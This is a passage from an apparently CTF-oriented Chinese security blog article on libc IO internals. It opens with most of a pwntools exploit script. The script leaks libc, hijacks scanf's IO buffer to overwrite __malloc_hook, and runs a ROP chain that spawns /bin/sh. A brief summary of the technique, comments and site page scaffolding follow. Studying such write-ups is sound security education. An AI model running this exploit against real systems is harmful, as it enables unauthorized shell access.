+&nbsp;&nbsp;&nbsp;&nbsp;HOST&nbsp;=&nbsp;sys.argv[1]
+&nbsp;&nbsp;&nbsp;&nbsp;PORT&nbsp;=&nbsp;int(sys.argv[2])
+&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;remote(HOST,&nbsp;PORT)
+def&nbsp;leak_libc():
+&nbsp;&nbsp;&nbsp;&nbsp;p.sendline(&#39;a&#39;&nbsp;*&nbsp;7)
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;worrier&nbsp;&#39;&nbsp;+&nbsp;&#39;a&#39;&nbsp;*&nbsp;7&nbsp;+&nbsp;&#39;\n&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;leak&nbsp;=&nbsp;((p.recvuntil(&#39;,&#39;)[:-1]).ljust(8,&nbsp;&#39;\x00&#39;))
+&nbsp;&nbsp;&nbsp;&nbsp;p.info(len(leak))
+&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;u64(leak)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;addr&nbsp;-&nbsp;0x7dd52
+def&nbsp;main():
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;GDB:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raw_input()
+&nbsp;&nbsp;&nbsp;&nbsp;libc_base&nbsp;=&nbsp;leak_libc()
+&nbsp;&nbsp;&nbsp;&nbsp;p.info(&#39;libc_base:&nbsp;{}&#39;.format(hex(libc_base)))
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;stackoverflow:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.sendline(str(0x5c28f8&nbsp;-&nbsp;0x10))
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;stackoverflow:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.sendline(str(0x200000))
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;ropchain:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(&#39;a&#39;)&nbsp;#&nbsp;doesn&#39;t&nbsp;matter
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;stackoverflow:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;will&nbsp;be&nbsp;written&nbsp;at&nbsp;&amp;_IO_buf_base
+&nbsp;&nbsp;&nbsp;&nbsp;malloc_hook_end&nbsp;=&nbsp;libc_base&nbsp;+&nbsp;libc.symbols[&#39;__malloc_hook&#39;]&nbsp;+&nbsp;8
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;p64(malloc_hook_end)
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;ropchain:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(&#39;b&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(payload)&nbsp;-&nbsp;1):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;stackoverflow:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;ropchain:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.send(&#39;x&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;=&nbsp;p64(malloc_hook_end)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p32(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p32(0x10)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0xffffffffffffffff)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(libc_base&nbsp;+&nbsp;0x3c3770)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0xffffffffffffffff)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(libc_base&nbsp;+&nbsp;0x3c19a0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(0)
+&nbsp;&nbsp;&nbsp;&nbsp;file_struct_left&nbsp;+=&nbsp;p64(libc_base&nbsp;+&nbsp;0x3be400)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;file_struct_left
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;payload.ljust(0x1f0,&nbsp;&#39;\x00&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(0x400a23)&nbsp;#&nbsp;rip
+&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(&#39;stackoverflow:&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;will&nbsp;be&nbsp;written&nbsp;in&nbsp;__malloc_hook
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Rop&nbsp;from&nbsp;here
+&nbsp;&nbsp;&nbsp;&nbsp;binsh_addr&nbsp;=&nbsp;0x0000000000602000&nbsp;+&nbsp;0x500
+&nbsp;&nbsp;&nbsp;&nbsp;pop_rdi_ret&nbsp;=&nbsp;0x000000000001fd7a&nbsp;&nbsp;+&nbsp;libc_base
+&nbsp;&nbsp;&nbsp;&nbsp;pop_rsi_ret&nbsp;=&nbsp;0x000000000001fcbd&nbsp;+&nbsp;libc_base
+&nbsp;&nbsp;&nbsp;&nbsp;pop_rdx_ret&nbsp;=&nbsp;0x0000000000001b92&nbsp;+&nbsp;libc_base
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;p64(pop_rdi_ret)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(0)&nbsp;#&nbsp;fd
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(pop_rsi_ret)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(binsh_addr)&nbsp;#&nbsp;buf
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(pop_rdx_ret)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(0x100)&nbsp;#&nbsp;nbytes
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(libc_base&nbsp;+&nbsp;libc.symbols[&#39;read&#39;])&nbsp;#&nbsp;read(0,&nbsp;binsh_addr,&nbsp;0x100)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(pop_rdi_ret)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(binsh_addr)&nbsp;#&nbsp;system_cmd&nbsp;=&nbsp;/bin/sh\x00
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(libc_base&nbsp;+&nbsp;libc.symbols[&#39;system&#39;])&nbsp;#&nbsp;system(&quot;/bin/sh\x00&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;p.send(&#39;/bin/sh\x00&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;p.interactive()
+if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+&nbsp;&nbsp;&nbsp;&nbsp;main()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这道题目其实就是一个写buf的手法的利用，只要能够想到用写buf的手法其实就很简单了。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="color: rgb(0, 0, 0); font-size: 18px;"><strong><span style="color: rgb(0, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结</span></strong></span><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 0, 0); font-size: 18px;"><strong><span style="color: rgb(0, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1.</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; white-space: pre;"></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">scanf和printf之类的输入输出函数最终都会调用相应虚函数完成底层操作，2.24之前可以通过更改虚表来控制执行流。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>底层操作最终通过read等系统调用进行完成，也就是实现在虚表里，被初始化进虚表。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>对于scanf来说，虚表实现写入的时候会使用到buf，这里的buf会在scanf时候用到，所以可以通过控制buf来达到对libc的一个任意写入，这个方法没有被2.24影响。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>libc当中值得注意的地方还有很多，应该更多的去深入到源码去寻找这些有意思的东西。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4490.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】教练！那根本不是IO！——从printf源码看libc的IO - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4490" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="86c40da76667b73d4595c63e81eafd83">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16968" user-name="诺可_凹凸曼_氪金母猪" href="javascript:;">
+                诺可_凹凸曼_氪金母猪            </a>
+                        <span class="comment-time">2017-09-28 19:22:04</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16968">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16968" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@竹岛咲子:转发微博</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16958" user-name="FSE2017" href="javascript:;">
+                FSE2017            </a>
+                        <span class="comment-time">2017-09-28 15:52:03</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16958">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16958" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">Repost</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4490" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4496.html" alt="【漏洞预警】Mac OS X存在Javascript沙箱绕过漏洞，可造成任意文件读取！（含PoC）" target="_blank">【漏洞预警】Mac OS X存在Jav...</a></li>
+                                <li><a href="/learning/detail/4495.html" alt="【漏洞分析】BlueBorne 蓝牙漏洞深入分析与PoC" target="_blank">【漏洞分析】BlueBorne 蓝牙漏...</a></li>
+                                <li><a href="/learning/detail/4488.html" alt="【漏洞预警】Linux PIE/stack 内存破坏漏洞(CVE–2017–1000253)预警" target="_blank">【漏洞预警】Linux PIE/sta...</a></li>
+                                <li><a href="/learning/detail/4473.html" alt="【技术分享】看我如何利用企业邮箱搞定上百企业内网或内部账号" target="_blank">【技术分享】看我如何利用企业邮箱搞...</a></li>
+                                <li><a href="/learning/detail/4489.html" alt="【技术分享】Android SO自动化逆向探究" target="_blank">【技术分享】Android SO自动化...</a></li>
+                                <li><a href="/learning/detail/4481.html" alt="【技术分享】Linux应急响应姿势浅谈" target="_blank">【技术分享】Linux应急响应姿势浅谈</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://appscan.360.cn/  " alt="360显危镜" target="_blank">360显危镜</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
